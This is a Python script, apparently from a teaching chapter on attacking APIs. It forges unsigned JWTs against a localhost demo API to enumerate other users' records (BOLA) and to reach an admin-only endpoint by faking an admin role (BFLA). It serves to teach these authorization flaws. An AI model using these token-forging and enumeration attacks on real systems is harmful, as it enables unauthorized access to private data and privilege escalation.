"""
Chapter 7 - Attacking APIs: authorization attacks (BOLA & BFLA) on the demo API.
"""
import jwt
import requests

BASE = "http://localhost:8000"


def token_for(user_id: int, role: str = "user") -> str:
    # The demo API doesn't verify signatures, so we can mint our own tokens.
    return jwt.encode({"sub": user_id, "role": role}, "secret", algorithm="HS256")


def bola_walk():
    """Enumerate every user's private record while logged in as bob (id 2)."""
    tok = token_for(2)
    for uid in range(1, 5):
        r = requests.get(f"{BASE}/users/{uid}",
                         headers={"Authorization": f"Bearer {tok}"}, timeout=5)
        print(f"/users/{uid} ->", r.status_code, r.json())


def bfla_escalate():
    """Reach the admin-only endpoint by forging role=admin in the token."""
    tok = token_for(2, role="admin")
    r = requests.get(f"{BASE}/admin/users",
                     headers={"Authorization": f"Bearer {tok}"}, timeout=5)
    print("/admin/users (forged admin) ->", r.status_code, r.json())


if __name__ == "__main__":
    bola_walk()
    bfla_escalate()
